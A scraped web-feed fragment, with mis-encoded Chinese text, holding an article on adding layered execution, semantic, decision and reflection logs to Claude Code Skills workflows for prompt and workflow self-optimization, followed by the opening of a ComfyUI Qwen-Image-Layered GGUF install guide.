tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨æ„å»ºåŸºäºå¤§æ¨¡å‹çš„ Agent æˆ– Workflow ç³»ç»Ÿæ—¶ï¼Œå¼€å‘è€…å¾€å¾€ä¼šé‡åˆ°ä¸€ä¸ªå…±åŒé—®é¢˜ï¼š<strong>ç³»ç»Ÿåœ¨ç¬¬ä¸€æ¬¡è·‘é€šä¹‹åï¼Œä¼˜åŒ–é«˜åº¦ä¾èµ–äººå·¥è°ƒ Prompt å’Œæµç¨‹</strong>ã€‚è¿™ç±»ç³»ç»Ÿâ€œèƒ½ç”¨â€ï¼Œä½†éš¾ä»¥è§„æ¨¡åŒ–æ¼”è¿›ã€‚</p>
<p>Claude Code Skills æä¾›äº†ä¸€ç§é«˜åº¦æ¨¡å—åŒ–çš„èƒ½åŠ›å°è£…æ–¹å¼ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿåƒæ­ç§¯æœ¨ä¸€æ ·ç¼–æ’å¤æ‚ä»»åŠ¡æµç¨‹ã€‚ä½†å¦‚æœç¼ºä¹ç³»ç»Ÿçº§çš„åé¦ˆä¸åæ€æœºåˆ¶ï¼ŒSkills ä»ç„¶åªæ˜¯ä¸€æ¬¡æ€§æ‰§è¡Œå•å…ƒï¼Œè€Œä¸æ˜¯å¯æˆé•¿çš„ç³»ç»Ÿã€‚</p>
<p>æœ¬æ–‡å°†ç³»ç»Ÿæ€§åœ°ä»‹ç»ï¼š<strong>å¦‚ä½•åœ¨ Claude Code Skills å·¥ä½œæµä¸­å¼•å…¥æ—¥å¿—ç³»ç»Ÿï¼Œå¹¶åŸºäºæ—¥å¿—æ„å»ºè‡ªä¼˜åŒ–ï¼ˆSelf-Optimizationï¼‰æ¶æ„</strong>ï¼Œä½¿ Workflow å…·å¤‡æŒç»­æ¼”è¿›èƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€ä»€ä¹ˆæ˜¯ã€Œè‡ªä¼˜åŒ–ã€çš„ Claude Code Skills ç³»ç»Ÿ</h2>
<p>éœ€è¦æ˜ç¡®çš„æ˜¯ï¼š</p>
<blockquote>
<p>Claude Code Skills çš„è‡ªä¼˜åŒ–ï¼Œå¹¶ä¸æ˜¯å¯¹æ¨¡å‹æœ¬èº«è¿›è¡Œè®­ç»ƒï¼Œè€Œæ˜¯å¯¹ <strong>Promptã€Skill ç»„åˆç­–ç•¥ä¸æµç¨‹å†³ç­–</strong> çš„æŒç»­æ”¹è¿›ã€‚</p>
</blockquote>
<p>ä¸€ä¸ªå…·å¤‡è‡ªä¼˜åŒ–èƒ½åŠ›çš„ç³»ç»Ÿï¼Œè‡³å°‘åº”æ»¡è¶³ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ol>
<li><strong>å¯è§‚æµ‹ï¼ˆObservableï¼‰</strong> ï¼šæ¯ä¸ª Skill çš„è¡Œä¸ºå’Œç»“æœéƒ½å¯è¢«è®°å½•ä¸åˆ†æ</li>
<li><strong>å¯åæ€ï¼ˆReflectiveï¼‰</strong> ï¼šç³»ç»Ÿèƒ½å¤Ÿè¯„ä¼°ä¸€æ¬¡æ‰§è¡Œçš„è´¨é‡ï¼Œè€Œä¸ä»…æ˜¯æˆåŠŸæˆ–å¤±è´¥</li>
<li><strong>å¯è°ƒæ•´ï¼ˆAdjustableï¼‰</strong> ï¼šPromptã€å‚æ•°ã€æµç¨‹å¯è¢«ç‰ˆæœ¬åŒ–å’Œæ›¿æ¢</li>
<li><strong>å¯æ¼”è¿›ï¼ˆEvolvableï¼‰</strong> ï¼šä¼˜åŒ–æ¥è‡ªå†å²æ‰§è¡Œæ•°æ®ï¼Œè€Œéä¸€æ¬¡æ€§ç»éªŒ</li>
</ol>
<p>æ—¥å¿—ç³»ç»Ÿï¼Œæ­£æ˜¯è¿™å››ç‚¹çš„åŸºç¡€è®¾æ–½ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€Claude Code Skills å·¥ä½œæµçš„åŸºæœ¬ç»“æ„</h2>
<p>ä¸€ä¸ªå…¸å‹çš„ Claude Code Skills å·¥ä½œæµå¯ä»¥æŠ½è±¡ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css">User Intent
   â†“
Planner Skillï¼ˆå†³ç­–ï¼‰
   â†“
Skill <span class="hljs-selector-tag">A</span> â†’ Skill <span class="hljs-selector-tag">B</span> â†’ Skill C
   â†“
Final Output
</code></pre>
<p>åœ¨ä¼ ç»Ÿå®ç°ä¸­ï¼ŒWorkflow å¾€å¾€åªæœ‰â€œè¾“å…¥â€å’Œâ€œè¾“å‡ºâ€ã€‚è€Œè‡ªä¼˜åŒ–æ¶æ„è¦æ±‚æˆ‘ä»¬å…³æ³¨ <strong>è¿‡ç¨‹æœ¬èº«</strong>ã€‚</p>
<p>å› æ­¤ï¼Œè®¾è®¡çš„æ ¸å¿ƒé—®é¢˜å˜æˆï¼š</p>
<blockquote>
<p>åœ¨å“ªäº›èŠ‚ç‚¹è®°å½•ä»€ä¹ˆä¿¡æ¯ï¼Œæ‰èƒ½æ”¯æ’‘åç»­ä¼˜åŒ–ï¼Ÿ</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€æ—¥å¿—ç³»ç»Ÿçš„å››å±‚æ¶æ„è®¾è®¡</h2>
<h3 data-id="heading-4">1. æ‰§è¡Œæ—¥å¿—ï¼ˆExecution Logsï¼‰â€”â€”å‘ç”Ÿäº†ä»€ä¹ˆ</h3>
<p>æ‰§è¡Œæ—¥å¿—ç”¨äºå®Œæ•´è®°å½•ä¸€æ¬¡ Skill è°ƒç”¨çš„å®¢è§‚äº‹å®ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿçš„åœ°åŸºã€‚</p>
<p><strong>å…¸å‹ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uuid"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workflow_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"hot_topic_pipeline"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"skill_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"HotTopicSearchSkill"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"input"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"query"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä»Šæ—¥ AI çƒ­ç‚¹"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"output_summary"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"result_count"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">87</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"latency_ms"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2310</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1736500000</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¯¥å±‚æ—¥å¿—å›ç­”çš„é—®é¢˜åªæœ‰ä¸€ä¸ªï¼š<strong>ç³»ç»Ÿåšäº†ä»€ä¹ˆ</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-5">2. è¯­ä¹‰æ—¥å¿—ï¼ˆSemantic Logsï¼‰â€”â€”ç»“æœè´¨é‡å¦‚ä½•</h3>
<p>æ‰§è¡Œæ˜¯å¦æˆåŠŸï¼Œå¹¶ä¸ç­‰ä»·äºç»“æœæ˜¯å¦â€œå¥½â€ã€‚</p>
<p>è¯­ä¹‰æ—¥å¿—å¼•å…¥ <strong>LLM-as-a-Judge</strong> æ€è·¯ï¼Œè®© Claude å¯¹è‡ªèº«äº§å‡ºè¿›è¡Œè¯„ä»·ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uuid"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"skill_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ContentIntegrationSkill"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"semantic_evaluation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"relevance_score"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.72</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"information_density"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"medium"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"redundancy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"high"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"missing_aspects"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"äº§ä¸šå½±å“"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"è§‚ç‚¹å†²çª"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å…³é”®åœ¨äºï¼š</p>
<ul>
<li>ä¸è¿½æ±‚ç»å¯¹å‡†ç¡®</li>
<li>åªè¦æ±‚ <strong>æŒ‡æ ‡åœ¨åŒä¸€ç³»ç»Ÿå†…å…·å¤‡ç›¸å¯¹ä¸€è‡´æ€§</strong></li>
</ul>
<hr/>
<h3 data-id="heading-6">3. å†³ç­–æ—¥å¿—ï¼ˆDecision Logsï¼‰â€”â€”ä¸ºä»€ä¹ˆè¿™ä¹ˆé€‰</h3>
<p>å½“ Workflow å¼•å…¥ Planner æˆ– Router Skill åï¼Œ<strong>å†³ç­–æœ¬èº«å°±æˆä¸ºä¼˜åŒ–å¯¹è±¡</strong>ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uuid"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"planner_decision"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"chosen_skills"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"HotTopicSearchSkill"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"SignalFilterSkill"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"WeChatArticleSkill"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"reasoning"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç›®æ ‡æ˜¯å…¬ä¼—å·èµ„è®¯å‹å†…å®¹"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™ç±»æ—¥å¿—ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨åæœŸå›ç­”ï¼š</p>
<ul>
<li>æŸä¸ª Skill æ˜¯å¦è¢«è¿‡åº¦æˆ–ä¸è¶³ä½¿ç”¨</li>
<li>å†³ç­–ç†ç”±æ˜¯å¦ä¸æœ€ç»ˆæ•ˆæœç›¸å…³</li>
</ul>
<hr/>
<h3 data-id="heading-7">4. åæ€æ—¥å¿—ï¼ˆReflection Logsï¼‰â€”â€”å¦‚ä½•åšå¾—æ›´å¥½</h3>
<p>åæ€æ—¥å¿—æ˜¯è‡ªä¼˜åŒ–æ¶æ„çš„æ ¸å¿ƒã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"uuid"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"reflection"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"what_worked"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"ä¿¡æ¯è¦†ç›–å¹¿"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"what_failed"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"å†…å®¹åŒè´¨åŒ–ä¸¥é‡"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"improvement_suggestions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"æœç´¢é˜¶æ®µåŠ å…¥è§‚ç‚¹å‹å…³é”®è¯"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"æ•´åˆé˜¶æ®µå¼•å…¥åå¯¹è§†è§’"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™ä¸€æ­¥ï¼Œé€šå¸¸ç”±ä¸€ä¸ªç‹¬ç«‹çš„ <strong>Reflection Skill</strong> å®Œæˆã€‚</p>
<hr/>
<h2 data-id="heading-8">å››ã€è‡ªä¼˜åŒ–é—­ç¯ï¼šä»æ—¥å¿—åˆ°ç³»ç»Ÿè¿›åŒ–</h2>
<p>å½“ä¸Šè¿°æ—¥å¿—å±‚é½å¤‡åï¼Œå¯ä»¥å½¢æˆå¦‚ä¸‹é—­ç¯ï¼š</p>
<pre><code class="hljs">æ‰§è¡Œ Workflow
   â†“
é‡‡é›†å¤šå±‚æ—¥å¿—
   â†“
Reflection Skill åˆ†æ
   â†“
æ›´æ–° Prompt / æµç¨‹ / ç­–ç•¥
   â†“
ä¸‹ä¸€æ¬¡æ‰§è¡Œ
</code></pre>
<p>éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼š</p>
<blockquote>
<p>è‡ªä¼˜åŒ–ä¸æ˜¯å®æ—¶è°ƒæ•´ï¼Œè€Œæ˜¯ <strong>åŸºäºå¤šæ¬¡æ‰§è¡Œåçš„ç­–ç•¥æ›´æ–°</strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">äº”ã€ä¸‰ç±»å…¸å‹è‡ªä¼˜åŒ–ç­–ç•¥</h2>
<h3 data-id="heading-10">1. Prompt è‡ªåŠ¨æ¼”è¿›</h3>
<p>é€šè¿‡èšåˆå†å² Reflection Logsï¼Œè®© Claude ç”Ÿæˆæ”¹è¿›ç‰ˆ Promptï¼Œå¹¶è¿›è¡Œç‰ˆæœ¬åŒ–ç®¡ç†ã€‚</p>
<p>é€‚åˆåœºæ™¯ï¼š</p>
<ul>
<li>å†…å®¹ç”Ÿæˆ</li>
<li>åˆ†ææ€»ç»“</li>
<li>å†™ä½œç±» Skill</li>
</ul>
<hr/>
<h3 data-id="heading-11">2. Workflow ç»“æ„ä¼˜åŒ–</h3>
<p>å½“æ—¥å¿—æŒç»­æš´éœ²æŸç±»é—®é¢˜ï¼ˆå¦‚ä¿¡æ¯é‡å¤ç‡é«˜ï¼‰ï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨æ’å…¥æˆ–æ›¿æ¢ Skillã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs">æœç´¢ â†’ è¿‡æ»¤ â†’ æ•´åˆ â†’ ç”Ÿæˆ

ä¼˜åŒ–ä¸ºï¼š
æœç´¢ â†’ ä¿¡å·æ‰“åˆ† â†’ è§‚ç‚¹æ‰©å±• â†’ æ•´åˆ â†’ ç”Ÿæˆ
</code></pre>
<hr/>
<h3 data-id="heading-12">3. Planner è‡ªåæ€</h3>
<p>å°† Planner æœ¬èº«è§†ä¸ºå¯ä¼˜åŒ–å¯¹è±¡ï¼Œè®©å…¶åŸºäºå†å²è½¨è¿¹ç»™å‡ºæ–°çš„é»˜è®¤å†³ç­–ç­–ç•¥ã€‚</p>
<p>è¿™åœ¨æœ¬è´¨ä¸Šå·²ç»æ¥è¿‘å¼ºåŒ–å­¦ä¹ ä¸­çš„ <strong>Policy Improvement</strong> æ€è·¯ã€‚</p>
<hr/>
<h2 data-id="heading-13">å…­ã€æœ€å°å¯è½åœ°å®ç°å»ºè®®ï¼ˆMVPï¼‰</h2>
<ol>
<li>æ‰€æœ‰ Skill å¼ºåˆ¶è¾“å‡ºç»“æ„åŒ– JSON</li>
<li>å¼•å…¥ Execution + Semantic Logs</li>
<li>æ–°å¢ç‹¬ç«‹ Reflection Skill</li>
<li>Prompt ç‰ˆæœ¬åŒ–ç®¡ç†</li>
</ol>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå†é€æ­¥å¼•å…¥ Planner å±‚ä¼˜åŒ–ã€‚</p>
<hr/>
<h2 data-id="heading-14">ç»“è¯­</h2>
<p>Claude Code Skills çš„çœŸæ­£ä»·å€¼ï¼Œå¹¶ä¸åªåœ¨äºâ€œæŠŠä»»åŠ¡æ‹†æˆå¤šä¸ª Skillâ€ï¼Œè€Œåœ¨äºï¼š</p>
<blockquote>
<p><strong>å°†ä¸€æ¬¡æ€§æ™ºèƒ½ï¼Œå‡çº§ä¸ºå¯ç§¯ç´¯ç»éªŒã€å¯æŒç»­æ¼”è¿›çš„ç³»ç»Ÿæ™ºèƒ½ã€‚</strong></p>
</blockquote>
<p>æ—¥å¿—ç³»ç»Ÿä¸æ˜¯é™„å±ç»„ä»¶ï¼Œè€Œæ˜¯ Claude Code Skills è‡ªä¼˜åŒ–æ¶æ„çš„ä¸­æ¢ç¥ç»ã€‚</p>
<p>å½“ä½ å¼€å§‹è®°å½•ã€åæ€å¹¶åˆ©ç”¨è¿™äº›æ—¥å¿—æ—¶ï¼Œä½ æ„å»ºçš„å°†ä¸å†æ˜¯ä¸€ä¸ª Workflowï¼Œè€Œæ˜¯ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šçš„ AI ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åœ¨ComfyUIä¸­ä½¿ç”¨Qwen-Image-Layered GGUFï¼šå®Œæ•´å®‰è£…å’Œä½¿ç”¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7594415509606072366</link>    <guid>https://juejin.cn/post/7594415509606072366</guid>    <pubDate>2026-01-13T02:05:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594415509606072366" data-draft-id="7594383365418188846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åœ¨ComfyUIä¸­ä½¿ç”¨Qwen-Image-Layered GGUFï¼šå®Œæ•´å®‰è£…å’Œä½¿ç”¨æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-13T02:05:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŠªåŠ›çŠ¯é”™ç©AI"/> <meta itemprop="url" content="https://juejin.cn/user/1366029853539604"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åœ¨ComfyUIä¸­ä½¿ç”¨Qwen-Image-Layered GGUFï¼šå®Œæ•´å®‰è£…å’Œä½¿ç”¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1366029853539604/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŠªåŠ›çŠ¯é”™ç©AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:05:59.000Z" title="Tue Jan 13 2026 02:05:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¼ ç»Ÿçš„å›¾åƒç¼–è¾‘éœ€è¦æ‰‹åŠ¨åˆ›å»ºè’™ç‰ˆã€å¤æ‚çš„é€‰åŒºæ“ä½œ,ä»¥åŠåœ¨Photoshopç­‰å·¥å…·ä¸­è€—è´¹æ•°å°æ—¶çš„ç²¾ç»†å·¥ä½œã€‚å¦‚æœä½ èƒ½ä¸€é”®è‡ªåŠ¨å°†ä»»ä½•å›¾åƒåˆ†è§£ä¸ºå¯ç¼–è¾‘çš„å›¾å±‚,ä¼šæ€ä¹ˆæ ·?è¿™æ­£æ˜¯Qwen-Image-Layeredä¸ºComfyUIå¸¦æ¥çš„é©å‘½æ€§åŠŸèƒ½ã€‚</p>
<p>Qwen-Image-Layeredç”±é˜¿é‡Œå·´å·´Qwenå›¢é˜Ÿå¼€å‘,æ˜¯ä¸€ä¸ªé©å‘½æ€§çš„AIæ¨¡å‹,èƒ½å¤Ÿè‡ªåŠ¨å°†å›¾åƒåˆ†è§£ä¸ºå¤šä¸ªç‹¬ç«‹çš„RGBAå›¾å±‚ã€‚æ¯ä¸ªå›¾å±‚åŒ…å«ç‰¹å®šçš„è¯­ä¹‰ç»„ä»¶â€”â€”èƒŒæ™¯ã€å‰æ™¯å¯¹è±¡ã€æ–‡æœ¬å’Œè£…é¥°å…ƒç´ â€”â€”å¯ä»¥ç‹¬ç«‹ç¼–è¾‘è€Œä¸å½±å“å›¾åƒçš„å…¶ä»–éƒ¨åˆ†ã€‚</p>
<p>GGUF(GPT-Generated Unified Format)ç‰ˆæœ¬ä½¿è¿™é¡¹å¼ºå¤§çš„æŠ€æœ¯å¯¹æ˜¾å­˜æœ‰é™çš„ç”¨æˆ·ä¹Ÿå˜å¾—å¯ç”¨ã€‚åœ¨è¿™ä»½ç»¼åˆæŒ‡å—ä¸­,ä½ å°†å­¦ä¹ å¦‚ä½•åœ¨ComfyUIä¸­å®‰è£…å’Œä½¿ç”¨Qwen-Image-Layered GGUF,å³ä½¿ä½ ä½¿ç”¨çš„æ˜¯æ¶ˆè´¹çº§ç¡¬ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b2c69aeef904c1e83ecdfeab6a3fbcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqq5Yqb54qv6ZSZ546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874759&amp;x-signature=HMJmMxRw6sS8wnLqabQe6WwxpQw%3D" alt="19" loading="lazy"/></p>
